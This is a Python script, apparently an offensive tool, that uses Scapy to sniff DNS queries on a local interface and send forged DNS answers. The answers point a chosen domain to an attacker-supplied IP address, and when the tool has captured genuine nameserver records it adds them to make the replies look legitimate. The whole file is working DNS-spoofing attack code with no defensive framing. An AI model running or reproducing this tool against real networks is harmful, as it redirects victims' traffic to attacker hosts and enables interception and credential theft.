from scapy.all import DNS, DNSRR, DNSQR, Ether, IP, UDP, sendp, sniff
import argparse

authoritative_nameservers = []


def get_ns(packet):
    global authoritative_nameservers
    if packet.haslayer(DNS) and DNSRR in packet:
        if packet[DNS].ns:
            authoritative_nameservers = packet[DNS].ns
            print("[+] Captured Authoritative Nameserver Signature")


def dns_forge(packet):
    global authoritative_nameservers
    args = parse_args()
    net_interface = args.interface
    query_filter = args.query_name

    if DNSQR not in packet or not packet.dport == 53:
        return
    try:
        query = packet[DNSQR].qname.decode('utf-8')
        if query_filter not in query:
            print(f"[-] Ignoring query: {query}")
            return
        else:
            print(f"[+] Poisoning query: {query}")
    except Exception:
        print("[-] Error")

    response_packet = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )/IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )/UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )/DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=0,
        rd=1,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        an=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='A',
            ttl=600,
            rdata=args.poison_ip
            )
        )
    
    # Modify packet if victim domain-joined
    if authoritative_nameservers:
        response_packet[DNS].nscount=1
        response_packet[DNS].ns = authoritative_nameservers[0]

    # Send the DNS response
    sendp(response_packet, iface=net_interface, verbose=0)
    print("[+] Sent Forged Packet")


def parse_args():
    # Parse Arguments
    parser = argparse.ArgumentParser(
        description="DNS Response Forger",
    )
    parser.add_argument('-m',
                        '--mode',
                        type=str,
                        help="Operation mode",
                        choices=['forge', 'poison'],
                        required=True)
    parser.add_argument('-i',
                        '--interface',
                        type=str,
                        help="Interface to sniff/poison on",
                        required=True)
    parser.add_argument('-d',
                        '--dns-server',
                        type=str,
                        help="IP address of Authoritative DNS Server",
                        required=True)
    parser.add_argument('-qn',
                        '--query-name',
                        type=str,
                        help="DNS Query Name to Poison",
                        required=True)
    parser.add_argument('-p',
                        '--poison-ip',
                        type=str,
                        help="IP address of to poison with",
                        required=True)

    args = parser.parse_args()

    return args


def main():
    global authoritative_nameservers
    args = parse_args()

    net_interface = args.interface
    
    if args.mode == 'forge':
        ns_resp_packet_filter = " and ".join([
            "udp src port 53",
            f"src host {args.dns_server}"
            ])
        print("[!] Capturing Authoritative Nameserver Signature....")
        while not authoritative_nameservers:
            sniff(filter=ns_resp_packet_filter, prn=get_ns, store=0, iface=net_interface, count=1)

    dns_req_packet_filter = " and ".join([
        "udp dst port 53",
        "udp[10] & 0x80 = 0"
        ])
    print(f"[!] Forging/Poisoning DNS responses for {args.query_name}")
    sniff(filter=dns_req_packet_filter, prn=dns_forge, store=0, iface=net_interface)


if __name__ == "__main__":
    main()